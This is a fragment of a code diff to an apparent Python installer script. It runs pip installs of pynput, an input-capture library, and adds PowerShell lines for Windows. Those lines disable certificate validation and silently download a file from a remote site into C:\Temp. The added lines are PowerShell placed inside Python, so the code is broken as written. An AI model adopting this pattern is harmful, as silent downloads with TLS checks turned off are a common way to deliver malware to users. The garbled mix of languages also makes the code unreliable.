@@ -4,5 +4,7 @@ if _platform == "linux" or _platform == "linux2":
     os.system("pip install pynput")
 elif _platform == "darwin":
     os.system("curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py")
+    os.system("python3 get-pip.py")
 elif _platform == "win32" or _platform == "win64":
-    
+    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+    (new-object System.Net.WebClient).DownloadFile("http://www.mysite.com", 'C:\Temp\file')
